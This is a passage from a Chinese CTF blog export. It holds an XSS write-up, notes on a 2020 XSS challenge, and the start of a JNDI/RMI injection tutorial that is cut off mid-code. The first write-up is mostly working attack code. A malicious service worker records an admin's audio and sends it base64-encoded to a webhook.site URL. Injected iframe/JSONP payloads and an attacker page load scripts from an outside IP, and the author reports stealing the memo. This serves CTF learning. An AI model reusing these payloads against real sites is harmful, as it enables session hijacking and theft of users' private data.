class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">self.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-keyword">async</span> (e) =&gt; &#123;<br>    <span class="hljs-keyword">if</span>(e.request.url.includes(<span class="hljs-string">&quot;/api/user/strellpwn&quot;</span>)) &#123;<br>        e.respondWith(<span class="hljs-keyword">new</span> Response(<span class="hljs-keyword">new</span> Blob([<span class="hljs-string">`</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">const webhook = &quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const log = (body) =&gt; &#123;</span><br><span class="hljs-string">    console.log(body);</span><br><span class="hljs-string">    fetch(webhook, &#123;</span><br><span class="hljs-string">        method: &quot;POST&quot;,</span><br><span class="hljs-string">        body,</span><br><span class="hljs-string">        mode: &quot;no-cors&quot;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const blobToBase64 = (blob) =&gt; &#123;</span><br><span class="hljs-string">  return new Promise((resolve, _) =&gt; &#123;</span><br><span class="hljs-string">    const reader = new FileReader();</span><br><span class="hljs-string">    reader.onloadend = () =&gt; resolve(reader.result);</span><br><span class="hljs-string">    reader.readAsDataURL(blob);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const pwn = () =&gt; &#123;</span><br><span class="hljs-string">    try &#123;</span><br><span class="hljs-string">        window.opener.origin;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    catch(err) &#123;</span><br><span class="hljs-string">        console.log(&quot;still cross origin...&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    try &#123;</span><br><span class="hljs-string">        window.opener.document.body.querySelector</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    catch(err) &#123;</span><br><span class="hljs-string">        console.log(&quot;page same-origin, but not loaded yet..&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let aud = window.opener.document.body.querySelector(&quot;audio&quot;);</span><br><span class="hljs-string">    if(!aud) &#123;</span><br><span class="hljs-string">        console.log(&quot;audio tag missing...&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let stream = aud.captureStream();</span><br><span class="hljs-string">    let rec = new MediaRecorder(stream);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    log(&quot;found_audio&quot;);</span><br><span class="hljs-string">    console.log(aud);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let btn = window.opener.document.querySelector(&quot;form[action=&#x27;/api/logout&#x27;] button&quot;);</span><br><span class="hljs-string">    if(!btn) &#123;</span><br><span class="hljs-string">        log(&quot;logout button missing!!!&quot;);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    btn.onclick = (e) =&gt; &#123;</span><br><span class="hljs-string">        e.preventDefault();</span><br><span class="hljs-string">        aud.play();</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    aud.onplay = () =&gt; &#123;</span><br><span class="hljs-string">        log(&quot;recording&quot;);</span><br><span class="hljs-string">        let chunks = [];</span><br><span class="hljs-string">        rec.ondataavailable = e =&gt; chunks.push(e.data);</span><br><span class="hljs-string">        rec.onstop = async e =&gt; &#123;</span><br><span class="hljs-string">            let final = new Blob(chunks, &#123;</span><br><span class="hljs-string">                type: &#x27;audio/mpeg&#x27;</span><br><span class="hljs-string">            &#125;);</span><br><span class="hljs-string">            let b64 = await blobToBase64(final);</span><br><span class="hljs-string">            log(b64);</span><br><span class="hljs-string">            console.log(&quot;done~&quot;);</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">        rec.start();</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    log(&quot;ready...&quot;);</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">window.onload = () =&gt; &#123;</span><br><span class="hljs-string">    if(window.opener.name !== &quot;pwning&quot;) return window.close();</span><br><span class="hljs-string">    setTimeout(() =&gt; window.open(&quot;&quot;, &quot;lmao&quot;).close(), 3000);</span><br><span class="hljs-string">    log(&quot;loaded&quot;);</span><br><span class="hljs-string">    console.log(&quot;loaded&quot;);</span><br><span class="hljs-string">    pwn();</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">        `</span>], &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;)));<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>另外一个需要注册来让admin请求另外的窗口</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">fetch(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;<br>    method: <span class="hljs-string">&quot;POST&quot;</span>,<br>    headers: &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;,<br>    body: <span class="hljs-string">&quot;&amp;username=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">`/api/user/strellpwn?#&lt;iframe async srcdoc=&quot;&lt;script src=&#x27;/api/user/info?callback=window.parent.open&#x27;&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;`</span>) + <span class="hljs-string">&quot;&amp;username=b&amp;password=12345&quot;</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><p>然后写一个html，起一个监听服务，让bot访问去登录</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;body&gt;<br>        &lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;http://127.0.0.1:9999/api/login&quot;</span> target=<span class="hljs-string">&quot;lmao&quot;</span>&gt;<br>            &lt;input name=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>            &lt;input name=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;b&quot;</span> /&gt;<br>            &lt;input name=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>        &lt;/form&gt;<br>        &lt;script&gt;<br>            <span class="hljs-keyword">const</span> sleep = <span class="hljs-function">(<span class="hljs-params">ms</span>) =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(r, ms));<br>            <span class="hljs-built_in">window</span>.onload = <span class="hljs-keyword">async</span> () =&gt; &#123;<br>                <span class="hljs-keyword">let</span> $ = <span class="hljs-built_in">document</span>.querySelector.bind(<span class="hljs-built_in">document</span>);<br>                navigator.sendBeacon(<span class="hljs-string">&quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>);<br><br>                $(<span class="hljs-string">&quot;input[name=username]&quot;</span>).value = <span class="hljs-string">`//39.107.239.30:2333/notekeeper.js?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/sc`</span> + <span class="hljs-string">`ript&gt;&quot;&gt;&lt;/iframe&gt;`</span>;<br>                $(<span class="hljs-string">&quot;input[name=password]&quot;</span>).value = <span class="hljs-string">`12345`</span>;<br>                $(<span class="hljs-string">&quot;form&quot;</span>).submit();<br><br>                <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2500</span>);<br><br>                $(<span class="hljs-string">&quot;input[name=username]&quot;</span>).value = <span class="hljs-string">`/api/user/strellpwn?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/user/info?callback=window.parent.open&#x27;&gt;&lt;/sc`</span> + <span class="hljs-string">`ript&gt;&quot;&gt;&lt;/iframe&gt;`</span>;<br>                $(<span class="hljs-string">&quot;input[name=password]&quot;</span>).value = <span class="hljs-string">`12345`</span>;<br>                $(<span class="hljs-string">&quot;form&quot;</span>).submit();<br><br>                <span class="hljs-built_in">window</span>.name = <span class="hljs-string">&quot;pwning&quot;</span>;<br>                navigator.sendBeacon(<span class="hljs-string">&quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;</span>, <span class="hljs-string">&quot;end&quot;</span>);<br>                location.href = <span class="hljs-string">&quot;http://127.0.0.1:9999/home?gogogo&quot;</span>;<br>            &#125;;<br>        &lt;/script&gt;<br>    &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure><p>访问成功时可以看到，bot并没有登出，也可以看到成功访问了两个账户。</p><p><strong><img src="https://img-blog.csdnimg.cn/f9a046d57de543fa9542853139987f8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></strong></p><p>但是由于可能js录音音频的原因，在webhook.site中会等待的有些慢，所以需要多让bot访问几次。最终能够看到，成功窃取到管理员语音备忘录。</p><p><img src="https://img-blog.csdnimg.cn/edb0fdb735ab4d53a5183118ef4e3978.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/210f9de4194241bbb5a08b9e2f3a48d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>最后将base编码放入src标签中就可以的到音频了</p><p><img src="https://img-blog.csdnimg.cn/aabb695e8efc4d9595ffcdd599a46266.png" alt="在这里插入图片描述"></p><h2 id="西湖论剑2020xss"><a href="#西湖论剑2020xss" class="headerlink" title="西湖论剑2020xss"></a>西湖论剑2020xss</h2><p>这也是一道可以利用service worker的题目，但比上面的那题要简单一些。但是由于没有环境所以就来看看思路吧。</p><p>关键源码，首先可以可以看到auto_reg_var()函数存在变量覆盖，故可以将callback变量覆盖掉，且jsonp返回的数据会被当做js代码执行，如?callback=alert(1)既可弹窗，但是存在50个字符的限制，不过可以通过引入外部js或者通过变量覆盖+eval来绕过。</p><p>后面也重写了jsonp函数，而且可以看到里面的操作，很关键的在于对于参数的拼接<code>url = url + &quot;?&quot; + &quot;callback=&quot; + funName;</code>。所以这里与上面很大的不同就是这里你可以在拼接过程中进行一些恶意的注释，从而可以直接通过importScripts引入js文件。</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">callback = <span class="hljs-string">&quot;get_user_login_status&quot;</span>;<br>auto_reg_var();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(jump_url) == <span class="hljs-string">&quot;undefined&quot;</span> || <span class="hljs-regexp">/^\//</span>.test(jump_url))&#123;<br>jump_url = <span class="hljs-string">&quot;/&quot;</span>;<br>&#125;<br>jsonp(<span class="hljs-string">&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot;</span> + callback,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)</span>&#123;<br><span class="hljs-keyword">if</span>(result[<span class="hljs-string">&#x27;status&#x27;</span>])&#123;<br>location.href = jump_url;<br>&#125;<br>&#125;)<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonp</span>(<span class="hljs-params">url, success</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>  <span class="hljs-keyword">if</span>(url.indexOf(<span class="hljs-string">&quot;callback&quot;</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">var</span> funName = <span class="hljs-string">&#x27;callback_&#x27;</span> + <span class="hljs-built_in">Date</span>.now() + <span class="hljs-built_in">Math</span>.random().toString().substr(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>);<br>    url = url + <span class="hljs-string">&quot;?&quot;</span> + <span class="hljs-string">&quot;callback=&quot;</span> + funName;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">var</span> funName = callback;<br>    &#125;<br>    <span class="hljs-built_in">window</span>[funName] = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        success(data);<br>        <span class="hljs-keyword">delete</span> <span class="hljs-built_in">window</span>[funName];<br>        <span class="hljs-built_in">document</span>.body.removeChild(script);<br>    &#125;<br>    script.src = url;<br>    <span class="hljs-built_in">document</span>.body.appendChild(script);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auto_reg_var</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">var</span> search = location.search.slice(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> search_arr = search.split(<span class="hljs-string">&#x27;&amp;&#x27;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i &lt; search_arr.length; i++)&#123;<br>[key,value] = search_arr[i].split(<span class="hljs-string">&quot;=&quot;</span>);<br><span class="hljs-built_in">window</span>[key] = value;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>最终的攻击过程，看看网上的吧，题目太久远了，也没找到环境，就没法复现了，但思路都差不多</p><p><img src="https://img-blog.csdnimg.cn/2c921ec523c542fd8cf7aa11cf18e3b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2022/03/01/2022-2-29-JNDI%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/03/01/2022-2-29-JNDI%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI了解"><a href="#JNDI了解" class="headerlink" title="JNDI了解"></a>JNDI了解</h1><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p><p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p><p>简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p><h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。所以其实命名的目的就是记录一些不方便记录的东西，就像人的名字或者dns的域名和ip地址的关系一样。不同的Naming System有不一样的记录方法。一个命名的展示由名字和分隔符提现。</p><h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p><p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p><h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p><p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p><p>拿JNDI的作用到底是什么呢，似乎还是不太理解，再来看看这篇文章应该就有一个初步的概念了。</p><p><a href="https://blog.csdn.net/zjlolife/article/details/8881154%E3%80%82">https://blog.csdn.net/zjlolife/article/details/8881154。</a></p><h1 id="JNDI前置知识"><a href="#JNDI前置知识" class="headerlink" title="JNDI前置知识"></a>JNDI前置知识</h1><h2 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h2><p><img src="http://images2017.cnblogs.com/blog/298371/201711/298371-20171118121255531-149192148.png"></p><p>JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口。我们的应用可以通过JNDI的API去访问相关服务提供的接口。</p><p>我们要使用JNDI，必须要有服务提供方，我们常用的就是JDBC驱动提供数据库连接服务，然后我们配置JNDI连接。。</p><p>JDK也为我们提供了一些服务接口：</p><ol><li><p>LDAP （Lightweight Directory Access Protocol） 轻量级目录访问协议</p></li><li><p>CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务</p></li><li><p>RMI（Java Remote Method Invocation）JAVA远程远程方法调用注册</p></li><li><p>DNS（Domain Name Service）域名服务</p></li></ol><p>在Java Jdk中提供了5个包，提供给JNDI的功能实现：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming:主要用于命名操作，它提供了命名服务的类和接口，该包定义了Context接口和InitialContext类<br><br>javax.naming.directory:主要用于目录操作，它定义了DirContext接口和InitialDirContext类<br><br>javax.naming.event:在命令目录服务器中请求事件通知<br><br>javax.naming.loap:提供LADP支持<br><br>javax.naming.spi:允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务<br></code></pre></div></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="关于RMI"><a href="#关于RMI" class="headerlink" title="关于RMI"></a>关于RMI</h2><h3 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h3><blockquote><p>远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p></blockquote><p>其实使用远程方法调用，就会涉及一个数据格式的问题，例如在js中一般都是使用json的格式进行大部分数据的传输，在php中进行php的数据序列化将数据统一形式储存和传输。这里也是一样，这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。</p><p>在RMI远程调用中，任何可以被远程调用方法的对象必须实现<code>java.rmi.Remote</code>接口，远程对象的实现必须继承<code>UnicastRemoteObject</code>类。如果不继承<code>UnicastRemoteObject</code>类，则需要手工初始化远程对象，在远程对象的构造方法的调用<code>UnicastRemoteObject.exportObject()</code>静态方法。</p><blockquote><p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的： </p></blockquote><p><img src="https://security.tencent.com/uploadimg_dir/201903/07d8ba7e439b55dd0c3240ab9a602999.png" alt="img"></p><p>从逻辑上来说，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的：</p><ol><li>Server端监听一个端口，这个端口是JVM随机选择的；</li><li>Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；</li><li>Client端可以调用Stub上的方法；</li><li>Stub连接到Server端监听的通信端口并提交参数；</li><li>远程Server端上执行具体的方法，并返回结果给Stub；</li><li>Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；</li></ol><h3 id="RMI注册表"><a href="#RMI注册表" class="headerlink" title="RMI注册表"></a>RMI注册表</h3><p>关于RMI注册表，其实就是用来解决客户端如何去调用Stub中的方法的。</p><p>这里所谓注册，就是提供一个注册表，在注册表中可以将方法绑定一个名字（也可以叫注册远程对象），以供其他的进程来调用需要的对象，所以Client要寻找Stub中的对象信息就直接查询这个注册表即可。</p><p>要注册远程对象，需要RMI URL和一个远程对象的引用。 </p><p><img src="https://img-blog.csdnimg.cn/e55ae81b9fab4c4bad377b25ca5a9140.png" alt="在这里插入图片描述"></p><p><code>LocateRegistry.getRegistry()</code>会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。 </p><p><img src="https://img-blog.csdnimg.cn/bd6fb5f47d2f4434b0851bd122d01d4b.png" alt="在这里插入图片描述"></p><p>这里应用使用 JNDI 获取远程 <code>sayHello()</code> 函数并传入 <code>&quot;KKfine&quot;</code> 参数进行调用时，真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，这一点是需要弄清楚的。</p><p>使用RMI Registry之后，RMI的调用关系是这样的： </p><p><img src="https://security.tencent.com/uploadimg_dir/201903/efd7772c92a8e21034c5897724ef37db.png" alt="img"></p><h3 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a><strong>动态加载类</strong></h3><p>如果远程获取RMI服务上的对象为<code>Reference</code>类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。因为一定会有某些类的class文件不在本地上，而像上面的Hello类是写在本地的。</p><p>Reference 中几个比较关键的属性：</p><p>​    1. <code>className </code>远程加载时所使用的类名</p><p>​    2.<code>classFactory</code>加载的class中需要实例化的名称</p><p>​    3.<code>classFactoryLocation</code>提供classes数据的地址 可以是file/ftp/http 等协议</p><p>例如这里定义一个 Reference 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 RMI 进行远程访问：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Reference refObj = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;refClassName&quot;</span>, <span class="hljs-string">&quot;insClassName&quot;</span>, <span class="hljs-string">&quot;http://example.com:12345/&quot;</span>);<br>ReferenceWrapper refObjWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(refObj);<br>registry.bind(<span class="hljs-string">&quot;refObj&quot;</span>, refObjWrapper);<br></code></pre></div></td></tr></table></figure><p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://example.com:12345/refClassName.class</code> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数。</p><h3 id="JNDI-协议动态转换"><a href="#JNDI-协议动态转换" class="headerlink" title="JNDI 协议动态转换"></a>JNDI 协议动态转换</h3><p>在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等）：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Properties env = <span class="hljs-keyword">new</span> Properties();<br>env.put(Context.INITIAL_CONTEXT_FACTORY,<br>        <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>env.put(Context.PROVIDER_URL,<br>        <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>Context ctx = <span class="hljs-keyword">new</span> InitialContext(env);<br></code></pre></div></td></tr></table></figure><p>而在调用 <code>lookup()</code> 或者 <code>search()</code> 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ctx.lookup(<span class="hljs-string">&quot;ldap://ip:2333/&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>具体可以看源码实现：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Context <span class="hljs-title">getURLOrDefaultInitCtx</span><span class="hljs-params">(Name paramName)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;<br>        <span class="hljs-keyword">return</span> getDefaultInitCtx(); <br>    &#125;<br>    <span class="hljs-keyword">if</span> (paramName.size() &gt; <span class="hljs-number">0</span>) &#123;<br>        String str1 = paramName.get(<span class="hljs-number">0</span>);<br>        String str2 = getURLScheme(str1);  <span class="hljs-comment">// 尝试解析 URI 中的协议</span><br>        <span class="hljs-keyword">if</span> (str2 != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span><br>            Context localContext = NamingManager.getURLContext(str2, 